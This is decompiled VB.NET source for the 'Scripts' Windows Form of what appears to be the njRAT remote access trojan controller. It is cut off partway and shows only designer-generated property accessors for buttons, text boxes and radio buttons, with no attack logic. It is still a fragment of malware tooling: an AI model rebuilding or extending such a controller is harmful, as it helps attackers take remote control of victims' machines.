Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x02000022 RID: 34
	<DesignerGenerated()>
	Public Partial Class Scripts
		Inherits Form

		' Token: 0x0600047A RID: 1146 RVA: 0x00003478 File Offset: 0x00001678
		<DebuggerNonUserCode()>
		Public Sub New()
			Scripts.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600047B RID: 1147 RVA: 0x0002586C File Offset: 0x00023A6C
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Scripts.__ENCList
			SyncLock _ENCList
				If Scripts.__ENCList.Count = Scripts.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Scripts.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Scripts.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Scripts.__ENCList(num) = Scripts.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Scripts.__ENCList.RemoveRange(num, Scripts.__ENCList.Count - num)
					Scripts.__ENCList.Capacity = Scripts.__ENCList.Count
				End If
				Scripts.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x1700018F RID: 399
		' (get) Token: 0x0600047E RID: 1150 RVA: 0x0002837C File Offset: 0x0002657C
		' (set) Token: 0x0600047F RID: 1151 RVA: 0x0000348C File Offset: 0x0000168C
		Friend Overridable Property TabControl1 As TabControl
			<DebuggerNonUserCode()>
			Get
				Return Me._TabControl1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabControl)
				Me._TabControl1 = value
			End Set
		End Property

		' Token: 0x17000190 RID: 400
		' (get) Token: 0x06000480 RID: 1152 RVA: 0x00028394 File Offset: 0x00026594
		' (set) Token: 0x06000481 RID: 1153 RVA: 0x00003495 File Offset: 0x00001695
		Friend Overridable Property TabPage2 As TabPage
			<DebuggerNonUserCode()>
			Get
				Return Me._TabPage2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Me._TabPage2 = value
			End Set
		End Property

		' Token: 0x17000191 RID: 401
		' (get) Token: 0x06000482 RID: 1154 RVA: 0x000283AC File Offset: 0x000265AC
		' (set) Token: 0x06000483 RID: 1155 RVA: 0x000283C4 File Offset: 0x000265C4
		Friend Overridable Property Button23 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button23
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button23_Click
				If Me._Button23 IsNot Nothing Then
					RemoveHandler Me._Button23.Click, value2
				End If
				Me._Button23 = value
				If Me._Button23 IsNot Nothing Then
					AddHandler Me._Button23.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000192 RID: 402
		' (get) Token: 0x06000484 RID: 1156 RVA: 0x0002841C File Offset: 0x0002661C
		' (set) Token: 0x06000485 RID: 1157 RVA: 0x00028434 File Offset: 0x00026634
		Friend Overridable Property Button22 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button22_Click
				If Me._Button22 IsNot Nothing Then
					RemoveHandler Me._Button22.Click, value2
				End If
				Me._Button22 = value
				If Me._Button22 IsNot Nothing Then
					AddHandler Me._Button22.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000193 RID: 403
		' (get) Token: 0x06000486 RID: 1158 RVA: 0x0002848C File Offset: 0x0002668C
		' (set) Token: 0x06000487 RID: 1159 RVA: 0x000284A4 File Offset: 0x000266A4
		Friend Overridable Property Button25 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button25
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button25_Click
				If Me._Button25 IsNot Nothing Then
					RemoveHandler Me._Button25.Click, value2
				End If
				Me._Button25 = value
				If Me._Button25 IsNot Nothing Then
					AddHandler Me._Button25.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000194 RID: 404
		' (get) Token: 0x06000488 RID: 1160 RVA: 0x000284FC File Offset: 0x000266FC
		' (set) Token: 0x06000489 RID: 1161 RVA: 0x00028514 File Offset: 0x00026714
		Friend Overridable Property Button24 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button24
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button24_Click
				If Me._Button24 IsNot Nothing Then
					RemoveHandler Me._Button24.Click, value2
				End If
				Me._Button24 = value
				If Me._Button24 IsNot Nothing Then
					AddHandler Me._Button24.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000195 RID: 405
		' (get) Token: 0x0600048A RID: 1162 RVA: 0x0002856C File Offset: 0x0002676C
		' (set) Token: 0x0600048B RID: 1163 RVA: 0x00028584 File Offset: 0x00026784
		Friend Overridable Property Button28 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button28
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button28_Click
				If Me._Button28 IsNot Nothing Then
					RemoveHandler Me._Button28.Click, value2
				End If
				Me._Button28 = value
				If Me._Button28 IsNot Nothing Then
					AddHandler Me._Button28.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000196 RID: 406
		' (get) Token: 0x0600048C RID: 1164 RVA: 0x000285DC File Offset: 0x000267DC
		' (set) Token: 0x0600048D RID: 1165 RVA: 0x000285F4 File Offset: 0x000267F4
		Friend Overridable Property Button27 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button27
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button27_Click
				If Me._Button27 IsNot Nothing Then
					RemoveHandler Me._Button27.Click, value2
				End If
				Me._Button27 = value
				If Me._Button27 IsNot Nothing Then
					AddHandler Me._Button27.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000197 RID: 407
		' (get) Token: 0x0600048E RID: 1166 RVA: 0x0002864C File Offset: 0x0002684C
		' (set) Token: 0x0600048F RID: 1167 RVA: 0x00028664 File Offset: 0x00026864
		Friend Overridable Property Button26 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button26_Click
				If Me._Button26 IsNot Nothing Then
					RemoveHandler Me._Button26.Click, value2
				End If
				Me._Button26 = value
				If Me._Button26 IsNot Nothing Then
					AddHandler Me._Button26.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000198 RID: 408
		' (get) Token: 0x06000490 RID: 1168 RVA: 0x000286BC File Offset: 0x000268BC
		' (set) Token: 0x06000491 RID: 1169 RVA: 0x000286D4 File Offset: 0x000268D4
		Friend Overridable Property Button29 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button29
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button29_Click
				If Me._Button29 IsNot Nothing Then
					RemoveHandler Me._Button29.Click, value2
				End If
				Me._Button29 = value
				If Me._Button29 IsNot Nothing Then
					AddHandler Me._Button29.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000199 RID: 409
		' (get) Token: 0x06000492 RID: 1170 RVA: 0x0002872C File Offset: 0x0002692C
		' (set) Token: 0x06000493 RID: 1171 RVA: 0x00028744 File Offset: 0x00026944
		Friend Overridable Property Button30 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button30
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button30_Click
				If Me._Button30 IsNot Nothing Then
					RemoveHandler Me._Button30.Click, value2
				End If
				Me._Button30 = value
				If Me._Button30 IsNot Nothing Then
					AddHandler Me._Button30.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019A RID: 410
		' (get) Token: 0x06000494 RID: 1172 RVA: 0x0002879C File Offset: 0x0002699C
		' (set) Token: 0x06000495 RID: 1173 RVA: 0x000287B4 File Offset: 0x000269B4
		Friend Overridable Property Button31 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button31
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button31_Click
				If Me._Button31 IsNot Nothing Then
					RemoveHandler Me._Button31.Click, value2
				End If
				Me._Button31 = value
				If Me._Button31 IsNot Nothing Then
					AddHandler Me._Button31.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019B RID: 411
		' (get) Token: 0x06000496 RID: 1174 RVA: 0x0002880C File Offset: 0x00026A0C
		' (set) Token: 0x06000497 RID: 1175 RVA: 0x00028824 File Offset: 0x00026A24
		Friend Overridable Property Button33 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button33
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button33_Click
				If Me._Button33 IsNot Nothing Then
					RemoveHandler Me._Button33.Click, value2
				End If
				Me._Button33 = value
				If Me._Button33 IsNot Nothing Then
					AddHandler Me._Button33.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019C RID: 412
		' (get) Token: 0x06000498 RID: 1176 RVA: 0x0002887C File Offset: 0x00026A7C
		' (set) Token: 0x06000499 RID: 1177 RVA: 0x00028894 File Offset: 0x00026A94
		Friend Overridable Property Button32 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button32
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button32_Click
				If Me._Button32 IsNot Nothing Then
					RemoveHandler Me._Button32.Click, value2
				End If
				Me._Button32 = value
				If Me._Button32 IsNot Nothing Then
					AddHandler Me._Button32.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019D RID: 413
		' (get) Token: 0x0600049A RID: 1178 RVA: 0x000288EC File Offset: 0x00026AEC
		' (set) Token: 0x0600049B RID: 1179 RVA: 0x00028904 File Offset: 0x00026B04
		Friend Overridable Property Button34 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button34
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button34_Click
				If Me._Button34 IsNot Nothing Then
					RemoveHandler Me._Button34.Click, value2
				End If
				Me._Button34 = value
				If Me._Button34 IsNot Nothing Then
					AddHandler Me._Button34.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700019E RID: 414
		' (get) Token: 0x0600049C RID: 1180 RVA: 0x0002895C File Offset: 0x00026B5C
		' (set) Token: 0x0600049D RID: 1181 RVA: 0x0000349E File Offset: 0x0000169E
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700019F RID: 415
		' (get) Token: 0x0600049E RID: 1182 RVA: 0x00028974 File Offset: 0x00026B74
		' (set) Token: 0x0600049F RID: 1183 RVA: 0x000034A7 File Offset: 0x000016A7
		Friend Overridable Property TabPage3 As TabPage
			<DebuggerNonUserCode()>
			Get
				Return Me._TabPage3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TabPage)
				Me._TabPage3 = value
			End Set
		End Property

		' Token: 0x170001A0 RID: 416
		' (get) Token: 0x060004A0 RID: 1184 RVA: 0x0002898C File Offset: 0x00026B8C
		' (set) Token: 0x060004A1 RID: 1185 RVA: 0x000034B0 File Offset: 0x000016B0
		Friend Overridable Property GroupBox20 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox20 = value
			End Set
		End Property

		' Token: 0x170001A1 RID: 417
		' (get) Token: 0x060004A2 RID: 1186 RVA: 0x000289A4 File Offset: 0x00026BA4
		' (set) Token: 0x060004A3 RID: 1187 RVA: 0x000034B9 File Offset: 0x000016B9
		Friend Overridable Property RadioButton9 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton9 = value
			End Set
		End Property

		' Token: 0x170001A2 RID: 418
		' (get) Token: 0x060004A4 RID: 1188 RVA: 0x000289BC File Offset: 0x00026BBC
		' (set) Token: 0x060004A5 RID: 1189 RVA: 0x000034C2 File Offset: 0x000016C2
		Friend Overridable Property RadioButton8 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton8 = value
			End Set
		End Property

		' Token: 0x170001A3 RID: 419
		' (get) Token: 0x060004A6 RID: 1190 RVA: 0x000289D4 File Offset: 0x00026BD4
		' (set) Token: 0x060004A7 RID: 1191 RVA: 0x000034CB File Offset: 0x000016CB
		Friend Overridable Property RadioButton7 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton7 = value
			End Set
		End Property

		' Token: 0x170001A4 RID: 420
		' (get) Token: 0x060004A8 RID: 1192 RVA: 0x000289EC File Offset: 0x00026BEC
		' (set) Token: 0x060004A9 RID: 1193 RVA: 0x000034D4 File Offset: 0x000016D4
		Friend Overridable Property RadioButton6 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton6 = value
			End Set
		End Property

		' Token: 0x170001A5 RID: 421
		' (get) Token: 0x060004AA RID: 1194 RVA: 0x00028A04 File Offset: 0x00026C04
		' (set) Token: 0x060004AB RID: 1195 RVA: 0x000034DD File Offset: 0x000016DD
		Friend Overridable Property RadioButton5 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton5 = value
			End Set
		End Property

		' Token: 0x170001A6 RID: 422
		' (get) Token: 0x060004AC RID: 1196 RVA: 0x00028A1C File Offset: 0x00026C1C
		' (set) Token: 0x060004AD RID: 1197 RVA: 0x000034E6 File Offset: 0x000016E6
		Friend Overridable Property RadioButton10 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton10 = value
			End Set
		End Property

		' Token: 0x170001A7 RID: 423
		' (get) Token: 0x060004AE RID: 1198 RVA: 0x00028A34 File Offset: 0x00026C34
		' (set) Token: 0x060004AF RID: 1199 RVA: 0x000034EF File Offset: 0x000016EF
		Friend Overridable Property GroupBox22 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox22 = value
			End Set
		End Property

		' Token: 0x170001A8 RID: 424
		' (get) Token: 0x060004B0 RID: 1200 RVA: 0x00028A4C File Offset: 0x00026C4C
		' (set) Token: 0x060004B1 RID: 1201 RVA: 0x000034F8 File Offset: 0x000016F8
		Friend Overridable Property RadioButton4 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton4 = value
			End Set
		End Property

		' Token: 0x170001A9 RID: 425
		' (get) Token: 0x060004B2 RID: 1202 RVA: 0x00028A64 File Offset: 0x00026C64
		' (set) Token: 0x060004B3 RID: 1203 RVA: 0x00003501 File Offset: 0x00001701
		Friend Overridable Property PictureBox4 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox4 = value
			End Set
		End Property

		' Token: 0x170001AA RID: 426
		' (get) Token: 0x060004B4 RID: 1204 RVA: 0x00028A7C File Offset: 0x00026C7C
		' (set) Token: 0x060004B5 RID: 1205 RVA: 0x0000350A File Offset: 0x0000170A
		Friend Overridable Property RadioButton3 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton3 = value
			End Set
		End Property

		' Token: 0x170001AB RID: 427
		' (get) Token: 0x060004B6 RID: 1206 RVA: 0x00028A94 File Offset: 0x00026C94
		' (set) Token: 0x060004B7 RID: 1207 RVA: 0x00003513 File Offset: 0x00001713
		Friend Overridable Property PictureBox3 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox3 = value
			End Set
		End Property

		' Token: 0x170001AC RID: 428
		' (get) Token: 0x060004B8 RID: 1208 RVA: 0x00028AAC File Offset: 0x00026CAC
		' (set) Token: 0x060004B9 RID: 1209 RVA: 0x0000351C File Offset: 0x0000171C
		Friend Overridable Property RadioButton2 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton2 = value
			End Set
		End Property

		' Token: 0x170001AD RID: 429
		' (get) Token: 0x060004BA RID: 1210 RVA: 0x00028AC4 File Offset: 0x00026CC4
		' (set) Token: 0x060004BB RID: 1211 RVA: 0x00003525 File Offset: 0x00001725
		Friend Overridable Property PictureBox2 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox2 = value
			End Set
		End Property

		' Token: 0x170001AE RID: 430
		' (get) Token: 0x060004BC RID: 1212 RVA: 0x00028ADC File Offset: 0x00026CDC
		' (set) Token: 0x060004BD RID: 1213 RVA: 0x0000352E File Offset: 0x0000172E
		Friend Overridable Property RadioButton1 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton1 = value
			End Set
		End Property

		' Token: 0x170001AF RID: 431
		' (get) Token: 0x060004BE RID: 1214 RVA: 0x00028AF4 File Offset: 0x00026CF4
		' (set) Token: 0x060004BF RID: 1215 RVA: 0x00003537 File Offset: 0x00001737
		Friend Overridable Property PictureBox1 As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._PictureBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._PictureBox1 = value
			End Set
		End Property

		' Token: 0x170001B0 RID: 432
		' (get) Token: 0x060004C0 RID: 1216 RVA: 0x00028B0C File Offset: 0x00026D0C
		' (set) Token: 0x060004C1 RID: 1217 RVA: 0x00028B24 File Offset: 0x00026D24
		Friend Overridable Property btnTestar As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._btnTestar
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.btnTestar_Click
				If Me._btnTestar IsNot Nothing Then
					RemoveHandler Me._btnTestar.Click, value2
				End If
				Me._btnTestar = value
				If Me._btnTestar IsNot Nothing Then
					AddHandler Me._btnTestar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B1 RID: 433
		' (get) Token: 0x060004C2 RID: 1218 RVA: 0x00028B7C File Offset: 0x00026D7C
		' (set) Token: 0x060004C3 RID: 1219 RVA: 0x00028B94 File Offset: 0x00026D94
		Friend Overridable Property btnEnviar As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._btnEnviar
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.btnEnviar_Click
				If Me._btnEnviar IsNot Nothing Then
					RemoveHandler Me._btnEnviar.Click, value2
				End If
				Me._btnEnviar = value
				If Me._btnEnviar IsNot Nothing Then
					AddHandler Me._btnEnviar.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B2 RID: 434
		' (get) Token: 0x060004C4 RID: 1220 RVA: 0x00028BEC File Offset: 0x00026DEC
		' (set) Token: 0x060004C5 RID: 1221 RVA: 0x00003540 File Offset: 0x00001740
		Friend Overridable Property GroupBox21 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox21 = value
			End Set
		End Property

		' Token: 0x170001B3 RID: 435
		' (get) Token: 0x060004C6 RID: 1222 RVA: 0x00028C04 File Offset: 0x00026E04
		' (set) Token: 0x060004C7 RID: 1223 RVA: 0x00003549 File Offset: 0x00001749
		Friend Overridable Property TextBox6 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox6 = value
			End Set
		End Property

		' Token: 0x170001B4 RID: 436
		' (get) Token: 0x060004C8 RID: 1224 RVA: 0x00028C1C File Offset: 0x00026E1C
		' (set) Token: 0x060004C9 RID: 1225 RVA: 0x00003552 File Offset: 0x00001752
		Friend Overridable Property TextBox5 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox5 = value
			End Set
		End Property

		' Token: 0x170001B5 RID: 437
		' (get) Token: 0x060004CA RID: 1226 RVA: 0x00028C34 File Offset: 0x00026E34
		' (set) Token: 0x060004CB RID: 1227 RVA: 0x0000355B File Offset: 0x0000175B
		Friend Overridable Property GroupBox7 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox7 = value
			End Set
		End Property

		' Token: 0x170001B6 RID: 438
		' (get) Token: 0x060004CC RID: 1228 RVA: 0x00028C4C File Offset: 0x00026E4C
		' (set) Token: 0x060004CD RID: 1229 RVA: 0x00003564 File Offset: 0x00001764
		Friend Overridable Property Label7 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label7 = value
			End Set
		End Property

		' Token: 0x170001B7 RID: 439
		' (get) Token: 0x060004CE RID: 1230 RVA: 0x00028C64 File Offset: 0x00026E64
		' (set) Token: 0x060004CF RID: 1231 RVA: 0x00028C7C File Offset: 0x00026E7C
		Friend Overridable Property Button35 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button35
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button35_Click
				If Me._Button35 IsNot Nothing Then
					RemoveHandler Me._Button35.Click, value2
				End If
				Me._Button35 = value
				If Me._Button35 IsNot Nothing Then
					AddHandler Me._Button35.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B8 RID: 440
		' (get) Token: 0x060004D0 RID: 1232 RVA: 0x00028CD4 File Offset: 0x00026ED4
		' (set) Token: 0x060004D1 RID: 1233 RVA: 0x00028CEC File Offset: 0x00026EEC
		Friend Overridable Property Button36 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button36
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button36_Click
				If Me._Button36 IsNot Nothing Then
					RemoveHandler Me._Button36.Click, value2
				End If
				Me._Button36 = value
				If Me._Button36 IsNot Nothing Then
					AddHandler Me._Button36.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170001B9 RID: 441
		' (get) Token: 0x060004D2 RID: 1234 RVA: 0x00028D44 File Offset: 0x00026F44
		' (set) Token: 0x060004D3 RID: 1235 RVA: 0x0000356D File Offset: 0x0000176D
		Friend Overridable Property GroupBox6 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox6 = value
			End Set
		End Property

		' Token: 0x170001BA RID: 442
		' (get) Token: 0x060004D4 RID: 1236 RVA: 0x00028D5C File Offset: 0x00026F5C
		' (set) Token: 0x060004D5 RID: 1237 RVA: 0x00003576 File Offset: 0x00001776
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x170001BB RID: 443
		' (get) Token: 0x060004D6 RID: 1238 RVA: 0x00028D74 File Offset: 0x00026F74
		' (set) Token: 0x060004D7 RID: 1239 RVA: 0x0000357F File Offset: 0x0000177F
		Friend Overridable Property GroupBox5 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox5 = value
			End Set
		End Property

		' Token: 0x170001BC RID: 444
		' (get) Token: 0x060004D8 RID: 1240 RVA: 0x00028D8C File Offset: 0x00026F8C
		' (set) Token: 0x060004D9 RID: 1241 RVA: 0x00003588 File Offset: 0x00001788
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x170001BD RID: 445
		' (get) Token: 0x060004DA RID: 1242 RVA: 0x00028DA4 File Offset: 0x00026FA4
		' (set) Token: 0x060004DB RID: 1243 RVA: 0x00003591 File Offset: 0x00001791
		Friend Overridable Property GroupBox4 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox4 = value
			End Set
		End Property

		' Token: 0x170001BE RID: 446
		' (get) Token: 0x060004DC RID: 1244 RVA: 0x00028DBC File Offset: 0x00026FBC
		' (set) Token: 0x060004DD RID: 1245 RVA: 0x0000359A File Offset: 0x0000179A
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x170001BF RID: 447
		' (get) Token: 0x060004DE RID: 1246 RVA: 0x00028DD4 File Offset: 0x00026FD4
		' (set) Token: 0x060004DF RID: 1247 RVA: 0x000035A3 File Offset: 0x000017A3
		Friend Overridable Property GroupBox3 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox3 = value
			End Set
		End Property

		' Token: 0x170001C0 RID: 448
		' (get) Token: 0x060004E0 RID: 1248 RVA: 0x00028DEC File Offset: 0x00026FEC
